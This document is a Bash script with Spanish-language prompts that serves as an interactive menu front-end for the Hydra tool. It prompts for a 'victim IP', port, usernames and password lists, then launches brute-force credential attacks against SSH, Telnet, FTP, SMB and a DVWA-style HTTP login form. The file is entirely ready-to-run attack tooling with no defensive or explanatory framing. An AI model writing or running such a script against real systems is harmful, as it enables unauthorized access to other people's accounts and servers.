#!/bin/bash

echo ""
echo "HYDRA BRUTE-FORCE"
echo ""

opcion="ninguna"

function opcion1
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 22 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -l $user -P $passwd ssh://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion2
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 22 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese la User_List \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -L $users -P $passwd ssh://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion3
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 23 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -l $user -P $passwd telnet://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion4
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 23 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese la User_List \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -L $users -P $passwd telnet://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion5
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 21 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -l $user -P $passwd ftp://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion6
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 21 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese la User_List \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -L $users -P $passwd ftp://$ip:$puerto -t 4 -vV -I

   read
   return 0

}

function opcion7
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 80 - 443 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra $ip -l $user -P $passwd -vV http-form-post "/dvwa/login.php:username=$user&password=^PASS^&Login=Login:Login failed" -t 4 -I

   read
   return 0

}

function opcion8
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 80 - 443 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra $ip -L $users -P $passwd -vV http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -I

   read
   return 0

}

function opcion9
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 445 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Usuario \e[0m"
echo ""
read user

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -l $user -P $passwd smb://$ip:$puerto -t 4 -vV -I 2>/dev/null

   read
   return 0

}

function opcion10
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese Puerto \e[0m - \e[31m Ejemplo: 445 \e[0m"
echo ""
read puerto

echo ""
echo -e "\e[33m Ingrese el Users_List \e[0m"
echo ""
read users

echo ""
echo -e "\e[33m Ingrese Password/Password_List.txt \e[0m"
echo ""
read passwd

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

hydra -L $users -P $passwd smb://$ip:$puerto -t 4 -vV -I 2>/dev/null

   read
   return 0

}

while [ $opcion != "11"  ]
    do

echo ""

	echo -e "\e[31m \n	-- MENU -- \e[0m"
	echo ""
	echo -e "\e[33m \t1) \e[0m Ataque por SSH (1 User)"-------------------------------------"\e[33m \t2) \e[0m Ataque por SSH (User_List y Passwd_List)"
        echo -e "\e[33m \t3) \e[0m Ataque por TELNET (1 User)"----------------------------------"\e[33m \t4) \e[0m Ataque por TELNET (User_List y Passwd_List)"
        echo -e "\e[33m \t5) \e[0m Ataque por FTP (1 User)"-------------------------------------"\e[33m \t6) \e[0m Ataque por FTP (User_List y Passwd_List)"
	echo -e "\e[33m \t7) \e[0m Ataque por HTTP/HTTPS - POST (1 User)"-----------------------"\e[33m \t8) \e[0m Ataque por HTTP/HTTPS - POST (User_List y Passwd_List)"
        echo -e "\e[33m \t9) \e[0m Ataque por SMB (1 User)"-------------------------------------"\e[33m \t10) \e[0m Ataque por SMB (User_List y Passwd_List)"
	echo ""
	echo -e "\e[33m \t11) \e[0m Salir\n"
	echo -e "\e[33m \tOpcion: \c \e[0m"

read opcion

echo ""
echo -e "\e[33m -------------------------------------------------------------  \e[0m"

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
                "4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
                "6" )
                      opcion6
                      ;;
                "7" )
                      opcion7
                      ;;
                "8" )
                      opcion8
                      ;;
                "9" )
                      opcion9
                      ;;
                "10" )
                      opcion10
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
